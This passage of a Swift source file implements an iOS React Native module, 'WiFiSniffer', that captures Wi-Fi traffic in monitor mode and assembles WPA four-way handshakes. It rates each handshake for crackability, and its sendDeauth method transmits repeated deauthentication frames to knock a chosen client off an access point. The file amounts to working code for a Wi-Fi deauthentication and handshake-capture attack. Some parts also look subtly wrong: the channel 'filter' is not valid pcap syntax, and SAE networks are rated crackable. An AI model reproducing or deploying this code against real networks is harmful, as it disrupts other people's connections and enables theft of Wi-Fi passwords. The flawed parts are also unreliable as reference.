import CoreLocation
import Darwin
import Foundation
import Network
import NetworkExtension
import React
import SystemConfiguration.CaptiveNetwork
import pcap

private struct RadiotapInfo {
  let length: Int
  let signal: Int?
  let noise: Int?
  let channelFrequency: Int?
}

private enum PacketCaptureSessionError: Error {
  case open(String)
  case activate(String)
  case channel(String)
  case transmit(String)
  case malformedRadiotap
}

private struct CapturedFrame {
  let payload: Data
  let timestamp: TimeInterval
  let radiotap: RadiotapInfo
}

private final class RadiotapParser {
  private struct FieldSpec {
    let size: Int
    let alignment: Int
  }

  private static let fieldSpecs: [Int: FieldSpec] = [
    0: FieldSpec(size: 8, alignment: 8),
    1: FieldSpec(size: 1, alignment: 1),
    2: FieldSpec(size: 1, alignment: 1),
    3: FieldSpec(size: 4, alignment: 2),
    4: FieldSpec(size: 2, alignment: 2),
    5: FieldSpec(size: 1, alignment: 1),
    6: FieldSpec(size: 1, alignment: 1),
    7: FieldSpec(size: 2, alignment: 2),
    8: FieldSpec(size: 2, alignment: 2),
    9: FieldSpec(size: 2, alignment: 2),
    10: FieldSpec(size: 1, alignment: 1),
    11: FieldSpec(size: 1, alignment: 1),
    12: FieldSpec(size: 1, alignment: 1),
    13: FieldSpec(size: 1, alignment: 1),
    14: FieldSpec(size: 2, alignment: 2),
    15: FieldSpec(size: 2, alignment: 2),
    16: FieldSpec(size: 1, alignment: 1),
    17: FieldSpec(size: 1, alignment: 1),
    18: FieldSpec(size: 8, alignment: 8),
    19: FieldSpec(size: 3, alignment: 1),
    20: FieldSpec(size: 8, alignment: 4),
    21: FieldSpec(size: 12, alignment: 2),
    22: FieldSpec(size: 12, alignment: 8),
    23: FieldSpec(size: 12, alignment: 2),
    24: FieldSpec(size: 16, alignment: 2),
    25: FieldSpec(size: 12, alignment: 2),
    26: FieldSpec(size: 8, alignment: 4),
    27: FieldSpec(size: 8, alignment: 4),
    28: FieldSpec(size: 4, alignment: 2),
    29: FieldSpec(size: 4, alignment: 2),
    30: FieldSpec(size: 12, alignment: 4),
    31: FieldSpec(size: 0, alignment: 1),
  ]

  static func parse(_ data: Data) throws -> RadiotapInfo {
    guard data.count >= 4 else {
      throw PacketCaptureSessionError.malformedRadiotap
    }

    let headerLength = Int(UInt16(littleEndian: data.withUnsafeBytes { buffer in
      buffer.load(fromByteOffset: 2, as: UInt16.self)
    }))

    guard data.count >= headerLength else {
      throw PacketCaptureSessionError.malformedRadiotap
    }

    var offset = 4
    var presentFlags: [UInt32] = []

    repeat {
      guard offset + 4 <= headerLength else {
        throw PacketCaptureSessionError.malformedRadiotap
      }
      let word = UInt32(littleEndian: data.withUnsafeBytes { buffer in
        buffer.load(fromByteOffset: offset, as: UInt32.self)
      })
      presentFlags.append(word)
      offset += 4
    } while (presentFlags.last ?? 0) & 0x8000_0000 != 0

    var fieldOffset = offset
    var signal: Int?
    var noise: Int?
    var channelFrequency: Int?

    var fieldIndex = 0

    for flagsWord in presentFlags {
      for bit in 0..<32 {
        let mask = UInt32(1 << bit)
        if flagsWord & mask != 0 {
          let globalIndex = fieldIndex
          let spec = fieldSpecs[globalIndex] ?? FieldSpec(size: 0, alignment: 1)

          if spec.alignment > 1 {
            let padding = fieldOffset % spec.alignment
            if padding != 0 {
              fieldOffset += spec.alignment - padding
            }
          }

          guard fieldOffset + spec.size <= headerLength else {
            throw PacketCaptureSessionError.malformedRadiotap
          }

          let fieldRange = fieldOffset..<(fieldOffset + spec.size)
          let fieldData = data.subdata(in: fieldRange)

          switch globalIndex {
          case 3:
            if fieldData.count >= 2 {
              channelFrequency = Int(UInt16(littleEndian: fieldData.withUnsafeBytes { buffer in
                buffer.load(as: UInt16.self)
              }))
            }
          case 5:
            if let value = fieldData.first {
              signal = Int(Int8(bitPattern: value))
            }
          case 6:
            if let value = fieldData.first {
              noise = Int(Int8(bitPattern: value))
            }
          default:
            break
          }

          fieldOffset += spec.size
        }
        fieldIndex += 1
      }
    }

    return RadiotapInfo(length: headerLength, signal: signal, noise: noise, channelFrequency: channelFrequency)
  }
}

private final class PacketCaptureSession {
  private let interfaceName: String
  private let queue: DispatchQueue
  private var handle: OpaquePointer?

  var onFrame: ((CapturedFrame) -> Void)?
  var onError: ((Error) -> Void)?

  init(interfaceName: String, queue: DispatchQueue) {
    self.interfaceName = interfaceName
    self.queue = queue
  }

  deinit {
    stop()
  }

  func start(channel: Int) throws {
    try openHandle()
    try configureFilter()
    try queueCaptureLoop()
    try setChannel(channel)
  }

  func stop() {
    guard let handle = handle else { return }
    pcap_breakloop(handle)
    queue.sync {
      if let existingHandle = self.handle {
        pcap_close(existingHandle)
      }
      self.handle = nil
    }
  }

  func setChannel(_ channel: Int) throws {
    guard channel > 0 else { return }
    guard let handle = handle else {
      throw PacketCaptureSessionError.open("Capture session not active")
    }

    let frequency = PacketCaptureSession.frequency(for: channel)
    let filter = "radiotap.channel == \(frequency)"
    do {
      try applyFilter(filter)
    } catch {
      throw PacketCaptureSessionError.channel("Failed to set capture filter for channel \(channel): \(error)")
    }
  }

  func transmit(frame data: Data) throws {
    guard let handle = handle else {
      throw PacketCaptureSessionError.open("Capture session not active")
    }

    let result = data.withUnsafeBytes { bytes -> Int32 in
      guard let base = bytes.bindMemory(to: UInt8.self).baseAddress else {
        return -1
      }
      return pcap_sendpacket(handle, base, Int32(data.count))
    }

    if result != 0 {
      let message = String(cString: pcap_geterr(handle))
      throw PacketCaptureSessionError.transmit(message)
    }
  }

  private func queueCaptureLoop() throws {
    guard let handle = handle else {
      throw PacketCaptureSessionError.open("Capture session not active")
    }

    let unmanaged = Unmanaged.passUnretained(self)
    queue.async {
      let opaque = UnsafeMutableRawPointer(unmanaged.toOpaque())
      pcap_loop(handle, -1, { context, headerPointer, dataPointer in
        guard let context, let headerPointer, let dataPointer else {
          return
        }

        let session = Unmanaged<PacketCaptureSession>
          .fromOpaque(context)
          .takeUnretainedValue()

        let header = headerPointer.pointee
        let capturedLength = Int(header.caplen)
        let timestamp = TimeInterval(header.ts.tv_sec) + TimeInterval(header.ts.tv_usec) / 1_000_000.0
        let raw = Data(bytes: dataPointer, count: capturedLength)

        do {
          let radiotap = try RadiotapParser.parse(raw)
          let payload = raw.subdata(in: radiotap.length..<raw.count)
          let frame = CapturedFrame(payload: payload, timestamp: timestamp, radiotap: radiotap)
          session.onFrame?(frame)
        } catch {
          session.onError?(error)
        }
      }, opaque)
    }
  }

  private func openHandle() throws {
    if handle != nil {
      return
    }

    var errorBuffer = [Int8](repeating: 0, count: Int(PCAP_ERRBUF_SIZE))
    guard let created = pcap_create(interfaceName, &errorBuffer) else {
      let message = String(cString: &errorBuffer)
      throw PacketCaptureSessionError.open(message)
    }

    guard pcap_set_snaplen(created, 65535) == 0 else {
      let message = String(cString: pcap_geterr(created))
      pcap_close(created)
      throw PacketCaptureSessionError.open(message)
    }

    _ = pcap_set_promisc(created, 1)
    _ = pcap_set_rfmon(created, 1)
    _ = pcap_set_timeout(created, 1000)
    _ = pcap_set_immediate_mode(created, 1)

    let status = pcap_activate(created)
    guard status >= 0 else {
      let message = String(cString: pcap_statustostr(status))
      pcap_close(created)
      throw PacketCaptureSessionError.activate(message)
    }

    handle = created
  }

  private func configureFilter() throws {
    try applyFilter("(wlan type mgt and wlan subtype beacon) or (wlan type mgt and wlan subtype deauth) or (wlan type data)")
  }

  private func applyFilter(_ filter: String) throws {
    guard let handle = handle else {
      throw PacketCaptureSessionError.open("Capture session not active")
    }

    var program = bpf_program()
    let compileResult = filter.withCString { expression in
      pcap_compile(handle, &program, expression, 1, PCAP_NETMASK_UNKNOWN)
    }

    guard compileResult == 0 else {
      let message = String(cString: pcap_geterr(handle))
      throw PacketCaptureSessionError.open(message)
    }

    let setResult = pcap_setfilter(handle, &program)
    pcap_freecode(&program)

    guard setResult == 0 else {
      let message = String(cString: pcap_geterr(handle))
      throw PacketCaptureSessionError.open(message)
    }
  }

  static func frequency(for channel: Int) -> Int {
    if channel <= 0 {
      return 0
    }

    if channel <= 14 {
      return 2407 + channel * 5
    }

    if channel >= 182 {
      return 4000 + channel * 5
    }

    return 5000 + channel * 5
  }
}

private final class SSIDCache {
  private var entries: [String: (ssid: String, updatedAt: TimeInterval)] = [:]
  private let queue = DispatchQueue(label: "com.wifihandshake.ssidcache", attributes: .concurrent)

  func update(bssid: String, ssid: String) {
    let normalized = SSIDCache.normalize(bssid: bssid)
    queue.async(flags: .barrier) {
      self.entries[normalized] = (ssid: ssid, updatedAt: Date().timeIntervalSince1970)
    }
  }

  func lookup(bssid: String) -> String? {
    let normalized = SSIDCache.normalize(bssid: bssid)
    var value: String?
    queue.sync {
      value = self.entries[normalized]?.ssid
    }
    return value
  }

  func purge(olderThan seconds: TimeInterval) {
    let threshold = Date().timeIntervalSince1970 - seconds
    queue.async(flags: .barrier) {
      self.entries = self.entries.filter { $0.value.updatedAt >= threshold }
    }
  }

  private static func normalize(bssid: String) -> String {
    return bssid.uppercased()
  }
}

private struct EapolKeyAnalysis {
  let message: Int
  let version: Int
  let type: Int
  let keyInfo: UInt16
  let keyData: Data
}

private struct RsnInformation {
  let version: Int
  let groupCipher: String
  let pairwiseCipher: String
  let akmSuites: [String]
}

private final class HandshakeTracker {
  private struct PacketRecord {
    let packet: [String: Any]
    let analysis: EapolKeyAnalysis
    let signal: Int
    let timestamp: TimeInterval
    let channel: Int
    let frequency: Int
  }

  private struct State {
    var packets: [PacketRecord]
    var seenMessages: Set<Int>
    var lastUpdated: TimeInterval
    var firstTimestamp: TimeInterval
  }

  private struct Key: Hashable {
    let bssid: String
    let client: String
  }

  private var states: [Key: State] = [:]
  private let expiry: TimeInterval = 12.0

  func reset() {
    states.removeAll()
  }

  func register(
    bssid: String,
    client: String,
    packet: [String: Any],
    analysis: EapolKeyAnalysis,
    signal: Int,
    timestamp: TimeInterval,
    channel: Int,
    frequency: Int
  ) -> [String: Any]? {
    purge(before: timestamp - expiry)

    let key = Key(bssid: bssid, client: client)
    var state = states[key] ?? State(
      packets: [],
      seenMessages: [],
      lastUpdated: timestamp,
      firstTimestamp: timestamp
    )

    state.packets.removeAll { record in
      record.analysis.message == analysis.message
    }

    state.packets.append(
      PacketRecord(
        packet: packet,
        analysis: analysis,
        signal: signal,
        timestamp: timestamp,
        channel: channel,
        frequency: frequency
      )
    )

    state.seenMessages.insert(analysis.message)
    state.lastUpdated = timestamp

    states[key] = state

    if state.seenMessages.isSuperset(of: [1, 2, 3, 4]) {
      states.removeValue(forKey: key)
      return buildHandshake(key: key, state: state)
    }

    return nil
  }

  private func purge(before threshold: TimeInterval) {
    states = states.filter { $0.value.lastUpdated >= threshold }
  }

  private func buildHandshake(key: Key, state: State) -> [String: Any] {
    let packets = state.packets.sorted { $0.timestamp < $1.timestamp }
    let averageSignal = Int(round(Double(packets.reduce(0) { $0 + $1.signal }) / Double(packets.count)))
    let channel = packets.map { $0.channel }.mostFrequent() ?? 0
    let frequency = packets.map { $0.frequency }.mostFrequent() ?? 0
    let timestamp = packets.last?.timestamp ?? Date().timeIntervalSince1970

    let keyInfo = packets.first?.analysis.keyInfo ?? 0
    let keyVersion = Int(keyInfo & 0x0007)
    let rsn = packets.compactMap { HandshakeTracker.parseRsnInformation($0.analysis.keyData) }.first

    let securityType = rsn?.akmSuites.first ?? "Unknown"
    let authKeyManagement = rsn?.akmSuites ?? []
    let groupCipher = rsn?.groupCipher ?? "Unknown"
    let pairwiseCipher = rsn?.pairwiseCipher ?? "Unknown"
    let isCrackable = HandshakeTracker.isCrackable(pairwiseCipher: pairwiseCipher)
    let complexity = HandshakeTracker.crackComplexity(
      pairwiseCipher: pairwiseCipher,
      akmSuites: authKeyManagement,
      crackable: isCrackable
    )

    return [
      "bssid": key.bssid,
      "clientMac": key.client,
      "timestamp": timestamp,
      "packets": packets.map { $0.packet },
      "isComplete": true,
      "apMac": key.bssid,
      "ssid": "",
      "securityType": securityType,
      "channel": channel,
      "signal": averageSignal,
      "keyVersion": keyVersion,
      "groupCipher": groupCipher,
      "pairwiseCipher": pairwiseCipher,
      "authKeyManagement": authKeyManagement,
      "isCrackable": isCrackable,
      "crackComplexity": complexity,
      "frequency": frequency,
    ]
  }

  private static func parseRsnInformation(_ keyData: Data) -> RsnInformation? {
    guard !keyData.isEmpty else { return nil }

    var index = keyData.startIndex
    while index + 2 <= keyData.endIndex {
      let elementId = keyData[index]
      let length = Int(keyData[index + 1])
      index += 2

      guard index + length <= keyData.endIndex else {
        break
      }

      if elementId == 0x30 {
        let rsnData = keyData.subdata(in: index..<(index + length))
        guard rsnData.count >= 8 else { break }

        let version = Int(UInt16(bigEndian: rsnData.withUnsafeBytes { buffer in
          buffer.load(as: UInt16.self)
        }))

        let groupCipherSuite = UInt32(bigEndian: rsnData.withUnsafeBytes { buffer in
          buffer.load(fromByteOffset: 2, as: UInt32.self)
        })

        let pairwiseCount = Int(UInt16(bigEndian: rsnData.withUnsafeBytes { buffer in
          buffer.load(fromByteOffset: 6, as: UInt16.self)
        }))

        var offset = 8
        var pairwiseCipher = "Unknown"
        if pairwiseCount > 0, offset + 4 <= rsnData.count {
          pairwiseCipher = cipherSuiteToString(
            UInt32(bigEndian: rsnData.withUnsafeBytes { buffer in
              buffer.load(fromByteOffset: offset, as: UInt32.self)
            })
          )
        }

        offset += pairwiseCount * 4

        guard offset + 2 <= rsnData.count else { break }
        let akmCount = Int(UInt16(bigEndian: rsnData.withUnsafeBytes { buffer in
          buffer.load(fromByteOffset: offset, as: UInt16.self)
        }))
        offset += 2

        var suites: [String] = []
        for _ in 0..<akmCount {
          guard offset + 4 <= rsnData.count else { break }
          let suite = UInt32(bigEndian: rsnData.withUnsafeBytes { buffer in
            buffer.load(fromByteOffset: offset, as: UInt32.self)
          })
          suites.append(akmSuiteToString(suite))
          offset += 4
        }

        return RsnInformation(
          version: version,
          groupCipher: cipherSuiteToString(groupCipherSuite),
          pairwiseCipher: pairwiseCipher,
          akmSuites: suites
        )
      }

      index += length
    }

    return nil
  }

  private static func cipherSuiteToString(_ suite: UInt32) -> String {
    switch suite {
    case 0x000FAC01:
      return "WEP-40"
    case 0x000FAC02:
      return "TKIP"
    case 0x000FAC04:
      return "CCMP"
    case 0x000FAC06:
      return "GCMP"
    case 0x000FAC08:
      return "GCMP-256"
    default:
      return "Unknown"
    }
  }

  private static func akmSuiteToString(_ suite: UInt32) -> String {
    switch suite {
    case 0x000FAC02:
      return "PSK"
    case 0x000FAC04:
      return "802.1X"
    case 0x000FAC06:
      return "FT-PSK"
    case 0x000FAC08:
      return "PSK-SHA256"
    case 0x000FAC0C:
      return "FT-SAE"
    case 0x000FAC12:
      return "SAE"
    default:
      return "Unknown"
    }
  }

  private static func isCrackable(pairwiseCipher: String) -> Bool {
    return pairwiseCipher == "TKIP" || pairwiseCipher == "CCMP"
  }

  private static func crackComplexity(
    pairwiseCipher: String,
    akmSuites: [String],
    crackable: Bool
  ) -> String {
    guard crackable else { return "Impossible" }
    if pairwiseCipher == "TKIP" {
      return "Easy"
    }
    if akmSuites.contains("PSK") || akmSuites.contains("SAE") {
      return "Medium"
    }
    return "Hard"
  }
}

private extension Array where Element == Int {
  func mostFrequent() -> Int? {
    guard !isEmpty else { return nil }
    var counts: [Int: Int] = [:]
    for value in self {
      counts[value, default: 0] += 1
    }
    return counts.max(by: { lhs, rhs in lhs.value < rhs.value })?.key
  }
}

@objc(WiFiSniffer)
class WiFiSniffer: RCTEventEmitter, CLLocationManagerDelegate {
  private let locationManager = CLLocationManager()
  private let captureQueue = DispatchQueue(label: "com.wifihandshake.capture", qos: .userInitiated)
  private var pathMonitor: NWPathMonitor?
  private var captureSession: PacketCaptureSession?
  private let ssidCache = SSIDCache()
  private let handshakeTracker = HandshakeTracker()
  private var isObserving = false
  private var currentChannel: Int = 1
  private var capturedPacketCount: Int = 0
  private var captureStartTimestamp: TimeInterval?

  override init() {
    super.init()
    locationManager.delegate = self
  }

  override class func requiresMainQueueSetup() -> Bool {
    return false
  }

  override func supportedEvents() -> [String]! {
    ["networkStatus", "packetCaptured", "locationPermission", "handshakeComplete"]
  }

  private func emitOnMain(_ name: String, body: Any?) {
    DispatchQueue.main.async { [weak self] in
      self?.sendEvent(withName: name, body: body)
    }
  }

  private func currentAuthorizationStatus() -> CLAuthorizationStatus {
    if #available(iOS 14.0, *) {
      return locationManager.authorizationStatus
    } else {
      return CLLocationManager.authorizationStatus()
    }
  }

  private func requestLocationIfNeeded() {
    if currentAuthorizationStatus() == .notDetermined {
      DispatchQueue.main.async {
        self.locationManager.requestWhenInUseAuthorization()
      }
    }
  }

  @objc(scanNetworks:rejecter:)
  func scanNetworks(_ resolve: @escaping RCTPromiseResolveBlock, rejecter reject: @escaping RCTPromiseRejectBlock) {
    requestLocationIfNeeded()

    let status = currentAuthorizationStatus()
    guard status == .authorizedAlways || status == .authorizedWhenInUse else {
      reject("PERMISSION_ERROR", "Location permission required for WiFi scanning", nil)
      return
    }

    fetchCurrentNetworks { [weak self] networks in
      networks.forEach { entry in
        if let bssid = entry["bssid"] as? String, let ssid = entry["ssid"] as? String {
          self?.ssidCache.update(bssid: bssid, ssid: ssid)
        }
      }
      resolve(networks)
    }
  }

  @objc(startCapture:channel:resolver:rejecter:)
  func startCapture(
    _ interfaceName: String,
    channel: NSNumber,
    resolver resolve: @escaping RCTPromiseResolveBlock,
    rejecter reject: @escaping RCTPromiseRejectBlock
  ) {
    captureQueue.async { [weak self] in
      guard let self = self else { return }

      do {
        try self.startNetworkMonitor()
        self.captureSession?.stop()
        let session = PacketCaptureSession(interfaceName: interfaceName, queue: self.captureQueue)
        session.onFrame = { [weak self] frame in
          self?.handleCapturedFrame(frame)
        }
        session.onError = { error in
          NSLog("[WiFiSniffer] Capture error: \(error)")
        }

        self.currentChannel = max(1, channel.intValue)
        self.capturedPacketCount = 0
        self.captureStartTimestamp = Date().timeIntervalSince1970
        self.handshakeTracker.reset()

        try session.start(channel: self.currentChannel)
        self.captureSession = session

        DispatchQueue.main.async {
          resolve(true)
        }
      } catch {
        self.captureSession = nil
        self.stopNetworkMonitor()
        DispatchQueue.main.async {
          reject("CAPTURE_ERROR", "Failed to start capture: \(error.localizedDescription)", error)
        }
      }
    }
  }

  @objc(stopCapture:rejecter:)
  func stopCapture(
    _ resolve: @escaping RCTPromiseResolveBlock,
    rejecter reject: @escaping RCTPromiseRejectBlock
  ) {
    captureQueue.async { [weak self] in
      guard let self = self else { return }
      self.captureSession?.stop()
      self.captureSession = nil
      self.stopNetworkMonitor()
      self.captureStartTimestamp = nil
      DispatchQueue.main.async {
        resolve(true)
      }
    }
  }

  @objc(getInterfaceStats:rejecter:)
  func getInterfaceStats(
    _ resolve: @escaping RCTPromiseResolveBlock,
    rejecter reject: @escaping RCTPromiseRejectBlock
  ) {
    let captureStartedAt: Any = captureStartTimestamp ?? NSNull()
    let stats: [String: Any] = [
      "interfaceName": "en0",
      "channel": currentChannel,
      "frequency": PacketCaptureSession.frequency(for: currentChannel),
      "capturedPackets": capturedPacketCount,
      "droppedPackets": 0,
      "lastUpdated": Date().timeIntervalSince1970,
      "captureStartedAt": captureStartedAt,
    ]

    resolve(stats)
  }

  @objc(setChannel:resolver:rejecter:)
  func setChannel(
    _ channel: NSNumber,
    resolver resolve: @escaping RCTPromiseResolveBlock,
    rejecter reject: @escaping RCTPromiseRejectBlock
  ) {
    captureQueue.async { [weak self] in
      guard let self = self else { return }
      let newChannel = max(1, channel.intValue)
      do {
        try self.captureSession?.setChannel(newChannel)
        self.currentChannel = newChannel
        DispatchQueue.main.async {
          resolve(true)
        }
      } catch {
        DispatchQueue.main.async {
          reject("CHANNEL_ERROR", "Failed to change channel: \(error.localizedDescription)", error)
        }
      }
    }
  }

  @objc(sendDeauth:clientMac:count:resolver:rejecter:)
  func sendDeauth(
    _ bssid: String,
    clientMac: String,
    count: NSNumber,
    resolver resolve: @escaping RCTPromiseResolveBlock,
    rejecter reject: @escaping RCTPromiseRejectBlock
  ) {
    captureQueue.async { [weak self] in
      guard let self = self else { return }
      let transmissions = max(1, count.intValue)

      guard let session = self.captureSession else {
        DispatchQueue.main.async {
          reject("CAPTURE_INACTIVE", "Capture session not active", nil)
        }
        return
      }

      do {
        for attempt in 0..<transmissions {
          let frame = self.buildDeauthFrame(bssid: bssid, clientMac: clientMac, sequence: UInt16(attempt))
          try session.transmit(frame: frame)
          usleep(1000 * 60)
        }
        DispatchQueue.main.async {
          resolve(true)
        }
      } catch {
        DispatchQueue.main.async {
          reject("DEAUTH_ERROR", "Failed to transmit deauthentication frames: \(error.localizedDescription)", error)
        }
      }
    }
  }

  override func startObserving() {
    isObserving = true
  }

  override func stopObserving() {
    isObserving = false
  }

  private func permissionStatusString(_ status: CLAuthorizationStatus) -> String {
    switch status {
    case .authorizedAlways, .authorizedWhenInUse:
      return "granted"
    case .denied, .restricted:
      return "denied"
    default:
      return "unknown"
    }
  }

  func locationManager(_ manager: CLLocationManager, didChangeAuthorization status: CLAuthorizationStatus) {
    guard isObserving else { return }
    emitOnMain("locationPermission", body: ["status": permissionStatusString(status)])
  }

  @available(iOS 14.0, *)
  func locationManagerDidChangeAuthorization(_ manager: CLLocationManager) {
    guard isObserving else { return }
    emitOnMain(
      "locationPermission",
      body: ["status": permissionStatusString(manager.authorizationStatus)]
    )
  }

  private func startNetworkMonitor() throws {
    pathMonitor?.cancel()
    let monitor = NWPathMonitor(requiredInterfaceType: .wifi)
    monitor.pathUpdateHandler = { [weak self] path in
      guard let self = self, self.isObserving else { return }
      let info: [String: Any] = [
        "available": path.status == .satisfied,
        "interfaceType": path.usesInterfaceType(.wifi) ? "WiFi" : "Other",
        "isExpensive": path.isExpensive,
      ]
      self.emitOnMain("networkStatus", body: info)
    }
    monitor.start(queue: captureQueue)
    pathMonitor = monitor
    emitOnMain(
      "networkStatus",
      body: [
        "available": true,
        "interfaceType": "WiFi",
        "isExpensive": false,
      ]
    )
  }

  private func stopNetworkMonitor() {
    pathMonitor?.cancel()
    pathMonitor = nil
  }

  private func handleCapturedFrame(_ frame: CapturedFrame) {
    guard isObserving else { return }
    guard frame.payload.count >= 24 else { return }

    let frameControl = UInt16(littleEndian: frame.payload.withUnsafeBytes { buffer in
      buffer.load(as: UInt16.self)
    })

    let frameType = Int((frameControl >> 2) & 0x3)
    let subtype = Int((frameControl >> 4) & 0xf)

    guard let addresses = extractAddresses(from: frame.payload, frameControl: frameControl) else {
      return
    }

    let signal = frame.radiotap.signal ?? 0
    let frequency = frame.radiotap.channelFrequency ?? PacketCaptureSession.frequency(for: currentChannel)
    let channel = channelForFrequency(frequency) ?? currentChannel

    ssidCache.purge(olderThan: 300)

    switch frameType {
    case 0:
      if let event = handleManagementFrame(
        subtype: subtype,
        addresses: addresses,
        frame: frame,
        signal: signal,
        channel: channel,
        frequency: frequency
      ) {
        capturedPacketCount += 1
        emitOnMain("packetCaptured", body: event)
      }
    case 2:
      if let result = handleDataFrame(
        frame: frame,
        frameControl: frameControl,
        addresses: addresses,
        signal: signal,
        channel: channel,
        frequency: frequency
      ) {
        let (packetEvent, analysis) = result
        capturedPacketCount += 1
        emitOnMain("packetCaptured", body: packetEvent)

        if let handshake = handshakeTracker.register(
          bssid: addresses.bssid,
          client: addresses.client,
          packet: packetEvent,
          analysis: analysis,
          signal: signal,
          timestamp: packetEvent["timestamp"] as? TimeInterval ?? frame.timestamp,
          channel: channel,
          frequency: frequency
        ) {
          emitOnMain("handshakeComplete", body: enrichHandshake(handshake, bssid: addresses.bssid))
        }
      }
    default:
      break
    }
  }

  private func handleManagementFrame(
    subtype: Int,
    addresses: FrameAddresses,
    frame: CapturedFrame,
    signal: Int,
    channel: Int,
    frequency: Int
  ) -> [String: Any]? {
    switch subtype {
    case 8, 5:
      if let ssid = parseSSID(from: frame.payload) {
        ssidCache.update(bssid: addresses.bssid, ssid: ssid)
      }
      return nil
    case 12:
      let reasonOffset = 24
      guard frame.payload.count >= reasonOffset + 2 else { return nil }
      let reasonCode = UInt16(littleEndian: frame.payload.withUnsafeBytes { buffer in
        buffer.load(fromByteOffset: reasonOffset, as: UInt16.self)
      })
      return [
        "timestamp": frame.timestamp,
        "type": "DEAUTH",
        "bssid": addresses.bssid,
        "source": addresses.source,
        "destination": addresses.destination,
        "clientMac": addresses.client,
        "signal": signal,
        "channel": channel,
        "frequency": frequency,
        "rawLength": frame.payload.count,
        "reasonCode": Int(reasonCode),
        "data": frame.payload.base64EncodedString(),
      ]
    default:
      return nil
    }
  }

  private func handleDataFrame(
    frame: CapturedFrame,
    frameControl: UInt16,
    addresses: FrameAddresses,
    signal: Int,
    channel: Int,
    frequency: Int
  ) -> ([String: Any], EapolKeyAnalysis)? {
    let headerLength = dataHeaderLength(frameControl: frameControl, payload: frame.payload)
    guard frame.payload.count > headerLength else { return nil }

    let payload = frame.payload.subdata(in: headerLength..<frame.payload.count)
    guard let analysis = parseEapol(from: payload) else { return nil }

    let packetEvent: [String: Any] = [
      "timestamp": frame.timestamp,
      "type": "EAPOL",
      "bssid": addresses.bssid,
      "source": addresses.source,
      "destination": addresses.destination,
      "clientMac": addresses.client,
      "signal": signal,
      "channel": channel,
      "frequency": frequency,
      "rawLength": frame.payload.count,
      "data": frame.payload.base64EncodedString(),
      "message": analysis.message,
      "eapolVersion": analysis.version,
      "eapolType": analysis.type,
    ]

    return (packetEvent, analysis)
  }

  private func enrichHandshake(_ handshake: [String: Any], bssid: String) -> [String: Any] {
    var enriched = handshake
    if let ssid = ssidCache.lookup(bssid: bssid), !ssid.isEmpty {
      enriched["ssid"] = ssid
    }
    return enriched
  }

  private struct FrameAddresses {
    let destination: String
    let source: String
    let bssid: String
    let client: String
  }

  private func extractAddresses(from payload: Data, frameControl: UInt16) -> FrameAddresses? {
    guard payload.count >= 24 else { return nil }

    let addr1 = formatMac(payload, range: 4..<10)
    let addr2 = formatMac(payload, range: 10..<16)
    let addr3 = formatMac(payload, range: 16..<22)

    let toDS = (frameControl & 0x0100) != 0
    let fromDS = (frameControl & 0x0200) != 0

    let destination: String
    let source: String
    let bssid: String
    var client: String

    if !toDS && !fromDS {
      destination = addr1
      source = addr2
      bssid = addr3
    } else if toDS && !fromDS {
      destination = addr3
      source = addr2
      bssid = addr1
    } else if !toDS && fromDS {
      destination = addr1
      source = addr3
      bssid = addr2
    } else {
      guard payload.count >= 30 else { return nil }
      let addr4 = formatMac(payload, range: 24..<30)
      destination = addr3
      source = addr2
      bssid = addr1
      client = addr4
      return FrameAddresses(destination: destination, source: source, bssid: bssid, client: client)
    }

    client = source == bssid ? destination : source
    return FrameAddresses(destination: destination, source: source, bssid: bssid, client: client)
  }

  private func formatMac(_ payload: Data, range: Range<Int>) -> String {
    let slice = payload.subdata(in: range)
    return slice.map { String(format: "%02X", $0) }.joined(separator: ":")
  }

  private func dataHeaderLength(frameControl: UInt16, payload: Data) -> Int {
    var length = 24
    let toDS = (frameControl & 0x0100) != 0
    let fromDS = (frameControl & 0x0200) != 0
    let subtype = Int((frameControl >> 4) & 0xf)

    if toDS && fromDS {
      length += 6
    }

    if subtype >= 8 {
      length += 2
    }

    let orderBitSet = (frameControl & 0x8000) != 0
    if orderBitSet {
      length += 4
    }

    if length > payload.count {
      length = payload.count
    }

    return length
  }

  private func parseEapol(from payload: Data) -> EapolKeyAnalysis? {
    guard payload.count >= 8 else { return nil }
    if payload[0] != 0xaa || payload[1] != 0xaa || payload[2] != 0x03 {
      return nil
    }

    let eapolHeaderOffset = 8
    guard payload.count >= eapolHeaderOffset + 4 else { return nil }

    let version = Int(payload[eapolHeaderOffset])
    let eapolType = Int(payload[eapolHeaderOffset + 1])
    let bodyLength = Int(UInt16(bigEndian: payload.withUnsafeBytes { buffer in
      buffer.load(fromByteOffset: eapolHeaderOffset + 2, as: UInt16.self)
    }))

    let keyStart = eapolHeaderOffset + 4
    guard payload.count >= keyStart + bodyLength else { return nil }

    let keyBody = payload.subdata(in: keyStart..<payload.count)
    guard keyBody.count >= 95 else { return nil }

    let keyInfo = UInt16(bigEndian: keyBody.withUnsafeBytes { buffer in
      buffer.load(fromByteOffset: 1, as: UInt16.self)
    })

    guard let message = determineMessage(keyInfo: keyInfo) else { return nil }

    let keyDataLength = Int(UInt16(bigEndian: keyBody.withUnsafeBytes { buffer in
      buffer.load(fromByteOffset: 93, as: UInt16.self)
    }))

    let keyDataStart = keyBody.startIndex + 95
    let keyDataEnd = min(keyBody.endIndex, keyDataStart + keyDataLength)
    let keyData = keyDataStart < keyDataEnd ? keyBody.subdata(in: keyDataStart..<keyDataEnd) : Data()

    return EapolKeyAnalysis(
      message: message,
      version: version,
      type: eapolType,
      keyInfo: keyInfo,
      keyData: keyData
    )
  }

  private func determineMessage(keyInfo: UInt16) -> Int? {
    let keyInfoFlags = keyInfo & 0x000f
    let isAck = (keyInfo & 0x0010) != 0

    if keyInfoFlags == 0x0008 && isAck {
      return 1
    }
    if keyInfoFlags == 0x0009 && !isAck {
      return 2
    }
    if keyInfoFlags == 0x0009 && isAck {
      return 3
    }
    if keyInfoFlags == 0x000b && !isAck {
      return 4
    }
    return nil
  }

  private func parseSSID(from payload: Data) -> String? {
    let fixedParametersLength = 12
    let infoStart = 24 + fixedParametersLength
    guard payload.count > infoStart else { return nil }

    var index = infoStart
    while index + 2 <= payload.count {
      let elementId = payload[index]
      let length = Int(payload[index + 1])
      index += 2
      guard index + length <= payload.count else { break }
      if elementId == 0 { // SSID
        let data = payload.subdata(in: index..<(index + length))
        return String(data: data, encoding: .utf8)
      }
      index += length
    }
    return nil
  }

  private func channelForFrequency(_ frequency: Int) -> Int? {
    if frequency == 0 { return nil }
    if frequency >= 2412 && frequency <= 2484 {
      return (frequency - 2407) / 5
    }
    if frequency >= 5000 && frequency <= 5895 {
      return (frequency - 5000) / 5
    }
